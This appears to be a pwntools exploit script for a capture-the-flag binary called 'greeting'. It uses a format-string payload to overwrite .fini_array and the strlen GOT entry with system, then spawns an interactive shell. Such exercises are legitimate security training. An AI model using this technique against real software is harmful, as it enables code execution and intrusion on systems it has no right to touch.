#!/usr/bin/python
from pwn import *
context.arch = 'i386'
p = process('./greeting')
elf = ELF('./greeting')
fini_array = 0x08049934
start = 0x080484F0
strlen_got = elf.got['strlen'] # 0x08049a54
system_plt = elf.plt['system'] # 0x08048490
p.recv()
payload = 'AA\x34\x99\x04\x08\x56\x9a\x04\x08\x54\x9a\x04\x08%34000c%12$hn%33556c%13$hn%31884c%14$hn'
p.sendline(payload)
p.recv()
p.sendline('/bin/sh\x00')
p.interactive()
